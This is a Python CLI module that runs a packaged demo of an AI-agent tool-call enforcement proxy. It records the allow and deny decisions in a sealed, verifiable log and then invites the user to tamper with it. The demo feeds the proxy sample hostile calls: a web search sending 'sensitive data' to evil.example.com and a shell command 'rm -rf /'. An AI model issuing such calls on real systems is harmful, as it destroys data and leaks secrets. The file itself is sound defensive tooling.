"""Packaged proof demo CLI."""

from __future__ import annotations

import argparse
import logging
import os
import tempfile
from contextlib import contextmanager
from importlib.resources import as_file, files
from pathlib import Path
from typing import Iterator

from stipul.cli.io import CLIError, read_jsonl, sha256_bytes
from stipul.cli.verify_cmd import trust_status, verify_session
from stipul.writ.proxy.server import ProxyServer

_DEMO_LABEL = "proof-demo"
_DEMO_TOKEN_SECRET = "stipul-demo-secret"
_INTERNAL_SESSION_ID = "11111111-1111-1111-1111-111111111111"


def register(subparsers: argparse._SubParsersAction[argparse.ArgumentParser]) -> None:
    parser = subparsers.add_parser(
        "demo",
        help="Run packaged Stipul demo flows",
    )
    demo_subparsers = parser.add_subparsers(dest="demo_command")
    demo_subparsers.required = True

    proof_parser = demo_subparsers.add_parser(
        "proof",
        help="Run the packaged proof demo",
    )
    proof_parser.set_defaults(handler=run)


@contextmanager
def _demo_charter_path() -> Iterator[Path]:
    resource = files("stipul.demo").joinpath("demo_charter.yaml")
    with as_file(resource) as path:
        yield Path(path)


@contextmanager
def _suppress_startup_warning() -> Iterator[None]:
    logger = logging.getLogger("stipul.writ.proxy.startup")
    previous_level = logger.level
    logger.setLevel(logging.ERROR)
    try:
        yield
    finally:
        logger.setLevel(previous_level)


@contextmanager
def _demo_environment(root: Path) -> Iterator[None]:
    previous_home = os.environ.get("HOME")
    previous_token_secret = os.environ.get("STIPUL_TOKEN_SECRET")
    os.environ["HOME"] = str(root)
    os.environ["STIPUL_TOKEN_SECRET"] = _DEMO_TOKEN_SECRET
    try:
        yield
    finally:
        if previous_home is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = previous_home

        if previous_token_secret is None:
            os.environ.pop("STIPUL_TOKEN_SECRET", None)
        else:
            os.environ["STIPUL_TOKEN_SECRET"] = previous_token_secret


def _run_proof_session(session_dir: Path, charter_path: Path) -> None:
    proxy: ProxyServer | None = None
    with _demo_environment(session_dir.parent), _suppress_startup_warning():
        try:
            proxy = ProxyServer.from_contract_path(
                charter_path,
                # Canonical Chronicle events still require a UUID session_id.
                session_id=_INTERNAL_SESSION_ID,
                events_path=session_dir / "events.jsonl",
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "filesystem.read",
                    "inputs": {"path": "/docs/report.md"},
                    "metadata": {"path": "/docs/report.md"},
                },
                lambda _request: {"content": "report data"},
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "web.search",
                    "inputs": {
                        "query": "sensitive data",
                        "egress_target": "evil.example.com",
                    },
                    "metadata": {"egress_target": "evil.example.com"},
                },
                lambda _request: {"ok": True},
            )
            proxy.handle_tool_call(
                {
                    "tool_name": "shell.exec",
                    "inputs": {"command": "rm -rf /"},
                    "metadata": {"command": "rm -rf /"},
                },
                lambda _request: {"ok": True},
            )
        finally:
            if proxy is not None:
                proxy.close()


def _proof_events(session_dir: Path) -> list[dict[str, object]]:
    return read_jsonl(session_dir / "events.jsonl")


def _display_reason(event: dict[str, object]) -> str | None:
    reason = event.get("reason")
    if not isinstance(reason, str) or not reason:
        return None
    if event.get("decision") == "allow" and reason == "risk_class":
        return "allowed_tool"
    return reason


def _replay_rows(events: list[dict[str, object]]) -> tuple[list[str], int]:
    lines: list[str] = []
    row_number = 0
    display_event_count = 0
    for event in events:
        event_type = event.get("event_type")
        if event_type in {"tool_call", "net_call"}:
            tool_name = event.get("tool_name")
            decision = event.get("decision")
            reason = _display_reason(event)
            if not all(isinstance(value, str) and value for value in (tool_name, decision, reason)):
                continue
            row_number += 1
            display_event_count += 1
            lines.append(
                f"  seq {row_number:<2} {decision:<7} {tool_name:<20} reason: {reason}"
            )
            continue
        if event_type == "session_close":
            row_number += 1
            lines.append(f"  seq {row_number:<2} close   session_close")
    return lines, display_event_count


def _render_output(session_dir: Path) -> str:
    events = _proof_events(session_dir)
    replay_rows, display_event_count = _replay_rows(events)
    if not replay_rows:
        raise CLIError("Demo produced no replayable Chronicle events", exit_code=3)

    verification = verify_session(
        session_dir,
        contract_path=session_dir / "contract.json",
        public_key_path=session_dir / "public_key.pem",
    )
    if (
        verification.chain_result.status != "INTACT"
        or verification.seal_result.status != "VALID"
    ):
        raise CLIError(
            "Demo self-verification failed: "
            f"chain={verification.chain_result.status} "
            f"seal={verification.seal_result.status}",
            exit_code=2,
        )

    seal_path = (session_dir / "seal.json").resolve()
    session_path = session_dir.resolve()
    seal_fingerprint = sha256_bytes(seal_path.read_bytes())[:8]
    trust = trust_status(
        chain_status=verification.chain_result.status,
        seal_status=verification.seal_result.status,
    )
    # Chronicle lifecycle events exist outside the operator-facing decision count.
    display_event_text = f"{display_event_count} decisions"

    lines = [
        "═══ Stipul Proof Demo ═══",
        "",
        f"Session: {_DEMO_LABEL}",
        "",
        *replay_rows,
        "",
        f"Trust: {trust}",
        f"  Chain: {verification.chain_result.status}",
        f"  Seal:  {verification.seal_result.status}",
        f"  Decisions: {display_event_count}",
        (
            f"  Fingerprint: {_DEMO_LABEL} | {verification.chain_result.status} | "
            f"{verification.seal_result.status} | {display_event_text} | {seal_fingerprint}"
        ),
        "",
        "═══ Tamper Challenge ═══",
        "",
        "To test tamper detection, modify the sealed evidence:",
        f'({{verify_note}})',
        "",
        f"  1. Open: {seal_path}",
        '  2. Find the field "terminal_sequence_id"',
        "  3. Change its value (e.g., change 4 to 999)",
        "  4. Save the file",
        f"  5. Run:  stipul verify {session_path}",
        "",
        "Watch Trust: VERIFIED become Trust: REJECTED.",
        "",
        "Proof complete: enforcement decisions recorded, chained, and sealed.",
    ]
    verify_note = (
        'Verify will show the internal session ID, not "proof-demo". '
        "This is the same session."
    )
    return "\n".join(line.format(verify_note=verify_note) for line in lines)


def run(_args: argparse.Namespace) -> int:
    try:
        demo_root = Path(tempfile.mkdtemp(prefix="stipul-proof-demo-")).resolve()
        session_dir = demo_root / "session"
        session_dir.mkdir(parents=True, exist_ok=True)
        with _demo_charter_path() as charter_path:
            _run_proof_session(session_dir, charter_path)
        print(_render_output(session_dir))
        return 0
    except CLIError:
        raise
    except (OSError, TypeError, ValueError) as exc:
        raise CLIError(str(exc), exit_code=3) from exc
